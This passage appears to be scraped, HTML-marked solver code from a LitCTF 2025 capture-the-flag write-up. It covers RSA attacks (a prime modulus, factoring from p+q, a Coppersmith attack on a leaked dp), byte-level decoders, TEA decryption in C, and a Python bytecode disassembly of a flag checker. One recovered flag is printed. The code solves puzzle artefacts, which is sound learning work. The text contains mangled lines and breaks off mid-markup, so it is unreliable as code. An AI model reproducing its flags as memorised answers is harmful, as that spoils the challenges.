class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Since n is prime, φ(n) = n - 1</span></span><br><span class="line">phi_n = n - <span class="number">1</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment">#LitCTF&#123;ee2c30dfe684f13a6e6c07b9ec90cc2c&#125;</span></span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">942430120937</span></span><br><span class="line"><span class="number">1394236058532304847090984665696457270451329940554604681101032877003319842642</span></span><br><span class="line"><span class="number">1576349568926279384369628072261252513038693891801832793244205614823946991510</span></span><br><span class="line"><span class="number">9031182321353345635660995951808001555621426730805001745903972812720437922952</span></span><br><span class="line"><span class="number">2534539199629164033610855636022774785947855765161278825011688773880094229014</span></span><br><span class="line"><span class="number">8741</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_factors_z3</span>(<span class="params">n_val, s_val</span>):</span><br><span class="line">    p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(p * q == n_val)</span><br><span class="line">    solver.add(p + q == s_val)</span><br><span class="line">    solver.add(p &gt; <span class="number">1</span>, q &gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        model = solver.model()</span><br><span class="line">        pv = model[p].as_long()</span><br><span class="line">        qv = model[q].as_long()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(pv, qv), <span class="built_in">max</span>(pv, qv)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        returnNone</span><br><span class="line"></span><br><span class="line">n = <span class="number">17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span>       </span><br><span class="line">pplusq = <span class="number">264904851121137920947287086482326881385752688705374889409196246630630770102009950641809599308303022933372963797747735183944234823071639906681654992838707159246410571356707755892308435202955680710788529503317217548344168832053609281562447929541166386062570844327209330092595380642976752220867037216961082705142</span>     </span><br><span class="line"></span><br><span class="line">res = recover_factors_z3(n, pplusq)</span><br><span class="line"><span class="keyword">if</span> res:</span><br><span class="line">    p, q = res</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    ifnot d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        <span class="built_in">print</span>(d)</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">leak = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"></span><br><span class="line">leak = leak &lt;&lt; <span class="number">180</span></span><br><span class="line">R.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = e * (leak + x) + (y - <span class="number">1</span>)</span><br><span class="line">res = small_roots(f,(<span class="number">2</span>^<span class="number">180</span>,<span class="number">2</span>^<span class="number">101</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    dp_low = root[<span class="number">0</span>]</span><br><span class="line">    dp = leak + dp_low</span><br><span class="line">    tmp = <span class="built_in">pow</span>(<span class="number">2</span>,e*dp,n) - <span class="number">2</span></span><br><span class="line">    p = gmpy2.gcd(tmp,n)</span><br><span class="line">    q = n // p</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        data = f_in.read()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data) - <span class="number">3</span>:  <span class="comment"># 需要至少4字节: f3 a0 (84/85) XX</span></span><br><span class="line">            <span class="comment"># 检查是否匹配 0xf3 0xa0</span></span><br><span class="line">            <span class="keyword">if</span> data[i] == <span class="number">0xf3</span> <span class="keyword">and</span> data[i+<span class="number">1</span>] == <span class="number">0xa0</span>:</span><br><span class="line">                opcode = data[i+<span class="number">2</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 确定要加的值</span></span><br><span class="line">                <span class="keyword">if</span> opcode == <span class="number">0x85</span>:</span><br><span class="line">                    add_value = <span class="number">0xd0</span></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x84</span>:</span><br><span class="line">                    add_value = <span class="number">0x90</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 处理下一个字节</span></span><br><span class="line">                <span class="keyword">if</span> i + <span class="number">3</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">                    original_byte = data[i+<span class="number">3</span>]</span><br><span class="line">                    result_byte = (original_byte + add_value) % <span class="number">256</span>  <span class="comment"># 防止溢出</span></span><br><span class="line">                    f_out.write(<span class="built_in">bytes</span>([result_byte]))</span><br><span class="line">                </span><br><span class="line">                i += <span class="number">4</span>  <span class="comment"># 跳过已处理的4字节</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">process_file(<span class="string">&#x27;hidden-word.txt&#x27;</span>, <span class="string">&#x27;2.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;处理完成！结果字节已保存到2.txt&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"> key_bytes = <span class="string">b&#x27;LitCTF2025&#x27;</span></span><br><span class="line"> key_length = <span class="built_in">len</span>(key_bytes)</span><br><span class="line"> encoded_vector = [</span><br><span class="line">     <span class="number">5776</span>, <span class="number">15960</span>, <span class="number">28657</span>, <span class="number">34544</span>, <span class="number">40294</span>, <span class="number">43824</span>, <span class="number">51825</span>, <span class="number">53033</span>, <span class="number">58165</span>, <span class="number">58514</span>,</span><br><span class="line">     <span class="number">61949</span>, <span class="number">56960</span>, <span class="number">53448</span>, <span class="number">49717</span>, <span class="number">47541</span>, <span class="number">45519</span>, <span class="number">40607</span>, <span class="number">40582</span>, <span class="number">38580</span>, <span class="number">42320</span>,</span><br><span class="line">     <span class="number">41171</span>, <span class="number">41269</span>, <span class="number">39370</span>, <span class="number">44224</span>, <span class="number">48760</span>, <span class="number">49558</span>, <span class="number">48128</span>, <span class="number">46531</span>, <span class="number">47088</span>, <span class="number">46181</span>,</span><br><span class="line">     <span class="number">46707</span>, <span class="number">46879</span>, <span class="number">48098</span>, <span class="number">52047</span>, <span class="number">53933</span>, <span class="number">56864</span>, <span class="number">60564</span>, <span class="number">64560</span>, <span class="number">66744</span>, <span class="number">63214</span>,</span><br><span class="line">     <span class="number">60873</span>, <span class="number">58245</span>, <span class="number">55179</span>, <span class="number">56857</span>, <span class="number">51532</span>, <span class="number">44308</span>, <span class="number">32392</span>, <span class="number">27577</span>, <span class="number">19654</span>, <span class="number">14342</span>,</span><br><span class="line">     <span class="number">11721</span>, <span class="number">9112</span>, <span class="number">6625</span></span><br><span class="line"> ]</span><br><span class="line"> message_length = <span class="number">44</span></span><br><span class="line"> equation_count = <span class="built_in">len</span>(encoded_vector)</span><br><span class="line"> coefficient_matrix = np.zeros((equation_count, message_length), dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(message_length):</span><br><span class="line">     <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(key_length):</span><br><span class="line">         coefficient_matrix[col + offset][col] = key_bytes[offset]</span><br><span class="line"></span><br><span class="line"> encoded_array = np.array(encoded_vector)</span><br><span class="line"> decoded_floats, _, _, _ = np.linalg.lstsq(coefficient_matrix, encoded_array, rcond=<span class="literal">None</span>)</span><br><span class="line"> decoded_bytes = <span class="built_in">bytes</span>([<span class="built_in">round</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> decoded_floats])</span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line">    <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> <span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"> //解密函数</span><br><span class="line"> void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">     uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], i; </span><br><span class="line">  uint32_t delta=<span class="number">0x114514</span>;  </span><br><span class="line">  uint32_t <span class="built_in">sum</span>=delta*<span class="number">32</span>;                 </span><br><span class="line">     uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   /* cache key */</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         /* basic cycle start */</span><br><span class="line">         v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (<span class="built_in">sum</span>+ v0) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * v0);</span><br><span class="line">         v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (<span class="built_in">sum</span>+ v1) ^ (*k + <span class="number">16</span> * v1);</span><br><span class="line">         <span class="built_in">sum</span>-= <span class="number">0x114514</span>;</span><br><span class="line">     &#125;                                              /* end cycle */</span><br><span class="line">     v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line"> &#125;</span><br><span class="line"> void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">     uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], i; </span><br><span class="line">  uint32_t delta=<span class="number">0x61C88747</span>;  </span><br><span class="line">  uint32_t <span class="built_in">sum</span>=-delta*<span class="number">0x40</span>;                 </span><br><span class="line">     uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   /* cache key */</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">0x40</span>; i++) &#123;                         /* basic cycle start */</span><br><span class="line">         v1 -= v0 ^ (k [((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (v0&lt;&lt;<span class="number">4</span>)));</span><br><span class="line">         <span class="built_in">sum</span> += <span class="number">0x61C88747</span>;</span><br><span class="line">         v0 -= v1 ^ (k[ (<span class="built_in">sum</span> &amp; <span class="number">3</span>)] + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ ( v1 &lt;&lt;<span class="number">4</span> )));</span><br><span class="line">     &#125;                                              /* end cycle */</span><br><span class="line">     v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="built_in">int</span> main() &#123;</span><br><span class="line">     uint32_t key[]=&#123;<span class="number">0x11223344</span>,<span class="number">0x55667788</span>,<span class="number">0x99AABBCC</span>,<span class="number">0xDDEEFF11</span>&#125;;</span><br><span class="line">  uint32_t enc[<span class="number">40</span>]=&#123;<span class="number">0x977457FE</span>, <span class="number">0xDA3E1880</span>, <span class="number">0xB8169108</span>, <span class="number">0x1E95285C</span>, <span class="number">0x1FE7E6F2</span>, <span class="number">0x2BC5FC57</span>, <span class="number">0xB28F0FA8</span>, <span class="number">0x8E0E0644</span>, <span class="number">0x68454425</span>, <span class="number">0xC57740D9</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (size_t i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i+=<span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   decrypt(enc+i,key);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  puts((char*)enc);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> RESUME <span class="number">0</span></span><br><span class="line"> <span class="number">6</span> <span class="number">2</span> LOAD_GLOBAL <span class="number">1</span> (NULL + <span class="built_in">input</span>)</span><br><span class="line"> <span class="number">14</span> LOAD_CONST <span class="number">1</span> (<span class="string">&#x27;input your flag &gt; &#x27;</span>)</span><br><span class="line"> <span class="number">16</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">20</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">30</span> LOAD_METHOD <span class="number">1</span> (encode)</span><br><span class="line"> <span class="number">52</span> PRECALL <span class="number">0</span></span><br><span class="line"> <span class="number">56</span> CALL <span class="number">0</span></span><br><span class="line"> <span class="number">66</span> STORE_FAST <span class="number">0</span> (user_input)</span><br><span class="line"> <span class="number">8</span> <span class="number">68</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"> <span class="number">70</span> STORE_FAST <span class="number">1</span> (decrypted)</span><br><span class="line"> <span class="number">9</span> <span class="number">72</span> LOAD_GLOBAL <span class="number">5</span> (NULL + <span class="built_in">range</span>)n84 LOAD_GLOBAL <span class="number">7</span> (NULL + <span class="built_in">len</span>)</span><br><span class="line"> <span class="number">96</span> LOAD_FAST <span class="number">0</span> (user_input)</span><br><span class="line"> <span class="number">98</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">102</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">112</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">116</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">126</span> GET_ITER</span><br><span class="line"> &gt;&gt; <span class="number">128</span> FOR_ITER <span class="number">34</span> (to <span class="number">198</span>)</span><br><span class="line"> <span class="number">130</span> STORE_FAST <span class="number">2</span> (i)</span><br><span class="line"> <span class="number">10</span> <span class="number">132</span> LOAD_FAST <span class="number">0</span> (user_input)</span><br><span class="line"> <span class="number">134</span> LOAD_FAST <span class="number">2</span> (i)</span><br><span class="line"> <span class="number">136</span> BINARY_SUBSCR</span><br><span class="line"> <span class="number">146</span> LOAD_CONST <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line"> <span class="number">148</span> BINARY_OP <span class="number">10</span> (-)</span><br><span class="line"> <span class="number">152</span> STORE_FAST <span class="number">3</span> (b)</span><br><span class="line"> <span class="number">11</span> <span class="number">154</span> LOAD_FAST <span class="number">1</span> (decrypted)</span><br><span class="line"> <span class="number">156</span> LOAD_METHOD <span class="number">4</span> (append)</span><br><span class="line"> <span class="number">178</span> LOAD_FAST <span class="number">3</span> (b)</span><br><span class="line"> <span class="number">180</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">184</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">194</span> POP_TOP</span><br><span class="line"> <span class="number">196</span> JUMP_BACKWARD <span class="number">35</span> (to <span class="number">128</span>)</span><br><span class="line"> <span class="number">13</span> &gt;&gt; <span class="number">198</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"> <span class="number">200</span> LOAD_CONST <span class="number">3</span> ((<span class="number">85</span>, <span class="number">84</span>, <span class="number">174</span>, <span class="number">227</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">207</span>, <span class="number">142</span>, <span class="number">77</span>, <span class="number">24</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">231</span>, <span class="number">213</span>, <span class="number">138</span>, <span class="number">153</span>, <span class="number">60</span>, <span class="number">29</span>, <span class="number">241</span>, <span class="number">241</span>, <span class="number">237</span>, <span class="number">208</span>, <span class="number">144</span>, <span class="number">222</span>, <span class="number">115</span>, <span class="number">16</span>, <span class="number">242</span>, <span class="number">239</span>, <span class="number">231</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">224</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">242</span>, <span class="number">128</span>, <span class="number">250</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">225</span>, <span class="number">63</span>, <span class="number">29</span>, <span class="number">242</span>, <span class="number">169</span>))</span><br><span class="line"> <span class="number">202</span> LIST_EXTEND <span class="number">1</span></span><br><span class="line"> <span class="number">204</span> STORE_FAST <span class="number">4</span> (fflag)</span><br><span class="line"> <span class="number">14</span> <span class="number">206</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"> <span class="number">208</span> LOAD_CONST <span class="number">4</span> ((<span class="number">19</span>, <span class="number">55</span>, <span class="number">192</span>, <span class="number">222</span>, <span class="number">202</span>, <span class="number">254</span>, <span class="number">186</span>, <span class="number">190</span>))</span><br><span class="line"> <span class="number">210</span> LIST_EXTEND <span class="number">1</span></span><br><span class="line"> <span class="number">212</span> STORE_FAST <span class="number">5</span> (key_ints)</span><br><span class="line"> <span class="number">16</span> <span class="number">214</span> LOAD_CONST <span class="number">5</span> (&lt;code <span class="built_in">object</span> encrypt at <span class="number">0x0000019CC7F9DFD0</span>, file <span class="string">&quot;d:</span></span><br><span class="line"><span class="string">codePYTHONIPParser1.py&quot;</span>, line <span class="number">16</span>&gt;)</span><br><span class="line"> <span class="number">216</span> MAKE_FUNCTION <span class="number">0</span></span><br><span class="line"> <span class="number">218</span> STORE_FAST <span class="number">6</span> (encrypt)</span><br><span class="line"> <span class="number">23</span> <span class="number">220</span> PUSH_NULL</span><br><span class="line"> <span class="number">222</span> LOAD_FAST <span class="number">6</span> (encrypt)</span><br><span class="line"> <span class="number">224</span> LOAD_FAST <span class="number">4</span> (fflag)</span><br><span class="line"> <span class="number">226</span> LOAD_FAST <span class="number">5</span> (key_ints)</span><br><span class="line"> <span class="number">228</span> PRECALL <span class="number">2</span></span><br><span class="line"> <span class="number">232</span> CALL <span class="number">2</span></span><br><span class="line"> <span class="number">242</span> STORE_FAST <span class="number">7</span> (encrypted_flag)</span><br><span class="line"> <span class="number">25</span> <span class="number">244</span> LOAD_FAST <span class="number">1</span> (decrypted)</span><br><span class="line"> <span class="number">246</span> LOAD_FAST <span class="number">7</span> (encrypted_flag)</span><br><span class="line"> <span class="number">248</span> COMPARE_OP <span class="number">2</span> (==)</span><br><span class="line"> <span class="number">254</span> POP_JUMP_FORWARD_IF_FALSE <span class="number">17</span> (to <span class="number">290</span>)</span><br><span class="line"> <span class="number">26</span> <span class="number">256</span> LOAD_GLOBAL <span class="number">11</span> (NULL + <span class="built_in">print</span>)</span><br><span class="line"> <span class="number">268</span> LOAD_CONST <span class="number">6</span> (<span class="string">&#x27;Good job! You made it!&#x27;</span>)</span><br><span class="line"> <span class="number">270</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">274</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">284</span> POP_TOP</span><br><span class="line"> <span class="number">286</span> LOAD_CONST <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line"> <span class="number">288</span> RETURN_VALUE</span><br><span class="line"> <span class="number">28</span> &gt;&gt; <span class="number">290</span> LOAD_GLOBAL <span class="number">11</span> (NULL + <span class="built_in">print</span>)</span><br><span class="line"> <span class="number">302</span> LOAD_CONST <span class="number">7</span> (<span class="string">&quot;Nah, don&#x27;t give up!&quot;</span>)</span><br><span class="line"> <span class="number">304</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">308</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">318</span> POP_TOP</span><br><span class="line"> <span class="number">320</span> LOAD_CONST <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line"> <span class="number">322</span> RETURN_VALUE</span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> encrypt at <span class="number">0x0000019CC7F9DFD0</span>, file <span class="string">&quot;d:</span></span><br><span class="line"><span class="string">codePYTHONIPParser1.py&quot;</span>, line <span class="number">16</span>&gt;:</span><br><span class="line"> <span class="number">16</span> <span class="number">0</span> RESUME <span class="number">0</span></span><br><span class="line"> <span class="number">17</span> <span class="number">2</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"> <span class="number">4</span> STORE_FAST <span class="number">2</span> (result)</span><br><span class="line"> <span class="number">18</span> <span class="number">6</span> LOAD_GLOBAL <span class="number">1</span> (NULL + <span class="built_in">range</span>)</span><br><span class="line"> <span class="number">18</span> LOAD_GLOBAL <span class="number">3</span> (NULL + <span class="built_in">len</span>)</span><br><span class="line"> <span class="number">30</span> LOAD_FAST <span class="number">0</span> (flag_bytes)</span><br><span class="line"> <span class="number">32</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">36</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">46</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">50</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">60</span> GET_ITER</span><br><span class="line"> &gt;&gt; <span class="number">62</span> FOR_ITER <span class="number">56</span> (to <span class="number">176</span>)</span><br><span class="line"> <span class="number">64</span> STORE_FAST <span class="number">3</span> (i)</span><br><span class="line"> <span class="number">19</span> <span class="number">66</span> LOAD_FAST <span class="number">0</span> (flag_bytes)</span><br><span class="line"> <span class="number">68</span> LOAD_FAST <span class="number">3</span> (i)</span><br><span class="line"> <span class="number">70</span> BINARY_SUBSCR</span><br><span class="line"> <span class="number">80</span> LOAD_FAST <span class="number">1</span> (key)</span><br><span class="line"> <span class="number">82</span> LOAD_FAST <span class="number">3</span> (i)</span><br><span class="line"> <span class="number">84</span> LOAD_GLOBAL <span class="number">3</span> (NULL + <span class="built_in">len</span>)</span><br><span class="line"> <span class="number">96</span> LOAD_FAST <span class="number">1</span> (key)</span><br><span class="line"> <span class="number">98</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">102</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">112</span> BINARY_OP <span class="number">6</span> (%)</span><br><span class="line"> <span class="number">116</span> BINARY_SUBSCR</span><br><span class="line"> <span class="number">126</span> BINARY_OP <span class="number">12</span> (^)</span><br><span class="line"> <span class="number">130</span> STORE_FAST <span class="number">4</span> (b)</span><br><span class="line"> <span class="number">20</span> <span class="number">132</span> LOAD_FAST <span class="number">2</span> (result)</span><br><span class="line"> <span class="number">134</span> LOAD_METHOD <span class="number">2</span> (append)</span><br><span class="line"> <span class="number">156</span> LOAD_FAST <span class="number">4</span> (b)</span><br><span class="line"> <span class="number">158</span> PRECALL <span class="number">1</span></span><br><span class="line"> <span class="number">162</span> CALL <span class="number">1</span></span><br><span class="line"> <span class="number">172</span> POP_TOP</span><br><span class="line"> <span class="number">174</span> JUMP_BACKWARD <span class="number">57</span> (to <span class="number">62</span>)</span><br><span class="line"> <span 